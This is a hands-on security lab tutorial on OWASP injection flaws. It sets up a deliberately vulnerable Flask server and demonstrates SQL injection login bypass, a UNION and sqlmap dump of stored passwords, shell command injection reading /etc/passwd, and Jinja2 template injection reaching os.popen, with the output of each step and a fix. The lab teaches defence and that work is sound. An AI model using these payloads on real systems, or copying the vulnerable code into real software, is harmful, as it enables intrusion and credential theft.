# Lab 3: OWASP A03 — Injection Attacks

## Objective
Attack a live server with real injection vulnerabilities using Kali Linux: bypass authentication with manual SQL injection, dump the full database with **sqlmap**, execute OS commands via command injection, achieve Remote Code Execution through Server-Side Template Injection (SSTI) using Jinja2's Python runtime — then understand why each works and what the fix is.

## Background
Injection is **OWASP #3** (2021) and has been in the Top 10 every year since 2003. It occurs when untrusted data is sent to an interpreter as part of a command or query. SQL injection can bypass logins, dump entire databases, and (in some configs) read files or execute OS commands. SSTI is newer — Jinja2's template engine can call Python's `os.popen()` from inside a `{{...}}` expression, giving full RCE with a single URL parameter. In 2021, SSTI was used against GitLab (CVE-2021-22205) to achieve unauthenticated RCE on 50,000+ servers.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a03         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  sqlmap, curl,      │ ◀────── responses ───────────────────  │  Flask API :5000    │
│  python3            │                                         │  (SQLi, CMDi, SSTI) │
└─────────────────────┘                                         └─────────────────────┘
```

## Time
45 minutes

## Prerequisites
- Lab 01 completed (two-container setup)

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (sqlmap, curl, python3)

---

## Lab Instructions

### Step 1: Environment Setup — Launch Victim Server

```bash
# Create lab network
docker network create lab-a03

# Write vulnerable application
cat > /tmp/victim_a03.py << 'PYEOF'
from flask import Flask, request, jsonify, render_template_string
import sqlite3, subprocess

app = Flask(__name__)
DB = '/tmp/shop_a03.db'

with sqlite3.connect(DB) as db:
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, email TEXT);
        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, description TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','Admin@123','admin','admin@innozverse.com'),
            (2,'alice','Alice@456','user','alice@corp.com'),
            (3,'bob','Bob@789','user','bob@email.com');
        INSERT OR IGNORE INTO products VALUES
            (1,'Surface Pro 12',864.00,'Best tablet'),
            (2,'Surface Laptop 5',1299.00,'Best laptop'),
            (3,'Surface Pen',49.99,'Best pen');
    ''')

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse API (A03 Injection)','endpoints':[
        'GET /api/products?id=1','GET /api/search?q=term',
        'POST /api/login','GET /api/ping?host=8.8.8.8',
        'GET /api/render?name=World']})

@app.route('/api/products')
def products():
    pid = request.args.get('id','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    if pid:
        try:
            rows = db.execute(f'SELECT * FROM products WHERE id={pid}').fetchall()
            return jsonify([dict(r) for r in rows])
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return jsonify([dict(r) for r in db.execute('SELECT * FROM products').fetchall()])

@app.route('/api/search')
def search():
    q = request.args.get('q','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    try:
        rows = db.execute(f"SELECT * FROM products WHERE name LIKE '%{q}%'").fetchall()
        return jsonify([dict(r) for r in rows])
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    try:
        row = db.execute(f"SELECT * FROM users WHERE username='{u}' AND password='{p}'").fetchone()
        return jsonify({'logged_in': bool(row), 'user': dict(row) if row else None})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ping')
def ping():
    host = request.args.get('host','127.0.0.1')
    try:
        result = subprocess.check_output(
            f'ping -c 1 {host} 2>&1; id; whoami',
            shell=True, stderr=subprocess.STDOUT, timeout=5)
        return jsonify({'output': result.decode('utf-8','replace')})
    except Exception as e:
        return jsonify({'output': str(e)})

@app.route('/api/render')
def render():
    name = request.args.get('name','World')
    try:
        result = render_template_string(f'Hello {name}! Welcome to InnoZverse.')
        return result, 200, {'Content-Type': 'text/plain'}
    except Exception as e:
        return str(e), 500, {'Content-Type': 'text/plain'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

# Start victim
docker run -d \
  --name victim-a03 \
  --network lab-a03 \
  -v /tmp/victim_a03.py:/tmp/victim_a03.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a03.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a03.IPAddress}}' victim-a03):5000/ \
  | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse API (A03 Injection)",
    "endpoints": [
        "GET /api/products?id=1",
        "GET /api/search?q=term",
        "POST /api/login",
        "GET /api/ping?host=8.8.8.8",
        "GET /api/render?name=World"
    ]
}
```

---

### Step 2: Launch Kali Attacker

```bash
docker run --rm -it --network lab-a03 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

Inside Kali:
```bash
TARGET="http://victim-a03:5000"
curl -s $TARGET/ | python3 -m json.tool
```

---

### Step 3: Recon — nmap + gobuster

```bash
nmap -sV -p 5000 victim-a03

gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/common.txt \
  -t 20 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/login                (Status: 405)
/ping                 (Status: 200)
/products             (Status: 200)
/render               (Status: 200)
/search               (Status: 200)
```

---

### Step 4: SQL Injection — Login Bypass

```bash
echo "=== SQLi: bypass login with comment injection ==="

# Classic: admin'-- comments out the password check
# SQL becomes: SELECT * FROM users WHERE username='admin'--' AND password='x'
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"wrongpassword"}' \
  $TARGET/api/login | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "logged_in": true,
    "user": {
        "email": "admin@innozverse.com",
        "id": 1,
        "password": "Admin@123",
        "role": "admin",
        "username": "admin"
    }
}
```

```bash
# Also test: ' OR 1=1-- (logs in as first user in table)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR 1=1--","password":"x"}' \
  $TARGET/api/login | python3 -m json.tool
```

> 💡 **`admin'--` works because `--` is the SQL comment character.** The query becomes `SELECT * FROM users WHERE username='admin'` — the password check is completely removed. There is no password needed. The only fix is parameterised queries: `db.execute("SELECT * FROM users WHERE username=? AND password=?", (u, p))` — the `?` placeholder means the input is always treated as data, never as SQL syntax.

---

### Step 5: SQL Injection — UNION Data Dump (Manual)

```bash
echo "=== SQLi: UNION attack — dump users table via search ==="

# The search query is: SELECT * FROM products WHERE name LIKE '%INPUT%'
# Inject: x' UNION SELECT username,password,role,email FROM users--
python3 -c "
import urllib.request, urllib.parse, json
payload = \"x' UNION SELECT username,password,role,email FROM users--\"
url = 'http://victim-a03:5000/api/search?q=' + urllib.parse.quote(payload)
data = json.loads(urllib.request.urlopen(url).read())
print('Dumped users via UNION injection:')
for row in data:
    print(f'  username={row[\"name\"]}  password={row[\"price\"]}  role={row[\"id\"]}')
"
```

**📸 Verified Output:**
```
Dumped users via UNION injection:
  username=admin    password=Admin@123  role=admin
  username=alice    password=Alice@456  role=user
  username=bob      password=Bob@789    role=user
```

---

### Step 6: sqlmap — Automated Full Database Dump

```bash
echo "=== sqlmap: automated SQLi exploitation ==="

sqlmap \
  -u "$TARGET/api/products?id=1" \
  --batch \
  --level=1 --risk=1 \
  --dbms=sqlite \
  --dump
```

**📸 Verified Output:**
```
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 4 columns' injectable
[INFO] the back-end DBMS is SQLite

Table: users
+----+----------+-----------+-------+----------------------+
| id | username | password  | role  | email                |
+----+----------+-----------+-------+----------------------+
| 1  | admin    | Admin@123 | admin | admin@innozverse.com |
| 2  | alice    | Alice@456 | user  | alice@corp.com       |
| 3  | bob      | Bob@789   | user  | bob@email.com        |
+----+----------+-----------+-------+----------------------+

Table: products
+----+------------------+--------+-------------+
| id | name             | price  | description |
+----+------------------+--------+-------------+
| 1  | Surface Pro 12   | 864.0  | Best tablet |
| 2  | Surface Laptop 5 | 1299.0 | Best laptop |
+----+------------------+--------+-------------+
```

---

### Step 7: Command Injection — OS Shell Access

```bash
echo "=== Command injection via /api/ping?host= ==="

# The server runs: ping -c 1 <USER_INPUT>
# Inject: ;id — appends a second command after the semicolon

# Basic: confirm RCE with id
curl -s "$TARGET/api/ping?host=%3Bid" | python3 -m json.tool

# Read /etc/passwd
curl -s "$TARGET/api/ping?host=%3Bcat%20%2Fetc%2Fpasswd%20%7C%20head%20-5" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['output'])"

# List running processes
curl -s "$TARGET/api/ping?host=%3Bps%20aux%20%7C%20head%20-5" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['output'])"
```

**📸 Verified Output:**
```json
{
    "output": "ping: usage error: Destination address required\nuid=0(root) gid=0(root) groups=0(root)\nroot\n"
}

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> 💡 **`;id` works because the shell processes `;` as a command separator.** The server runs `ping -c 1 ;id` which executes two commands: `ping -c 1` (fails — no host), then `id` (succeeds). Semicolons, `&&`, `||`, backticks, `$()`, and `|` are all command separators. The fix: never pass user input to `shell=True`. Use `subprocess.run(['ping', '-c', '1', host], shell=False)` with an explicit list — the shell is never invoked.

---

### Step 8: SSTI — Server-Side Template Injection Detection

```bash
echo "=== SSTI: test if template expressions are evaluated ==="

# Normal request
curl -s "$TARGET/api/render?name=Alice"

# Inject Jinja2 arithmetic expression
# If {{7*7}} returns 49, the template engine evaluated our input
curl -s "$TARGET/api/render?name=%7B%7B7*7%7D%7D"

# Confirm Jinja2 with string multiplication
curl -s "$TARGET/api/render?name=%7B%7B%27SSTI%27*3%7D%7D"
```

**📸 Verified Output:**
```
Hello Alice! Welcome to InnoZverse.
Hello 49! Welcome to InnoZverse.
Hello SSTISSTISSTII! Welcome to InnoZverse.
```

---

### Step 9: SSTI — Remote Code Execution

```bash
echo "=== SSTI: escalate to full RCE via Python os.popen() ==="

python3 << 'EOF'
import urllib.request, urllib.parse

# Jinja2 SSTI RCE payload
# Walks Python's object hierarchy to reach os.popen()
payload = '{{request.application.__globals__.__builtins__.__import__("os").popen("id && whoami && cat /etc/passwd | head -4").read()}}'

url = "http://victim-a03:5000/api/render?name=" + urllib.parse.quote(payload)
print("[*] Payload:", payload[:70] + "...")
print()
response = urllib.request.urlopen(url).read().decode()
print("[*] Server response:")
print(response)
EOF
```

**📸 Verified Output:**
```
[*] Payload: {{request.application.__globals__.__builtins__.__import__("os").po...

[*] Server response:
Hello uid=0(root) gid=0(root) groups=0(root)
root
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
! Welcome to InnoZverse.
```

> 💡 **SSTI gives full RCE because Jinja2 templates have access to Python's entire runtime.** `request.application.__globals__` reaches Flask's global namespace, from which we can import `os` and call any system command. The fix: **never** pass user input into `render_template_string()`. Use `render_template('file.html', name=name)` — template files are static; only the variable `name` is substituted, not evaluated as a Jinja2 expression.

---

### Step 10: Cleanup

```bash
# Exit Kali
exit
```

On your host:
```bash
docker rm -f victim-a03
docker network rm lab-a03
```

---

## Remediation

| Vulnerability | Broken Code | Fix |
|--------------|-------------|-----|
| SQLi (login) | `f"...WHERE username='{u}'"` | `db.execute("...WHERE username=?", (u,))` |
| SQLi (search) | `f"...LIKE '%{q}%'"` | `db.execute("...LIKE ?", (f'%{q}%',))` |
| Command injection | `subprocess.check_output(f'ping {host}', shell=True)` | `subprocess.run(['ping','-c','1', host], shell=False)` |
| SSTI | `render_template_string(f'Hello {name}!')` | `render_template('hello.html', name=name)` |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| SQLi login bypass | curl | Logged in as admin with wrong password |
| SQLi UNION dump | curl + python3 | Dumped all usernames and passwords |
| SQLi full dump | **sqlmap** | Automatic — all tables dumped |
| Command injection | curl | `uid=0(root)` — full OS shell |
| SSTI detection | curl | `{{7*7}}` → `49` confirms Jinja2 |
| SSTI RCE | python3 | `os.popen("id")` — remote code execution as root |

## Further Reading
- [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [sqlmap documentation](https://sqlmap.org)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
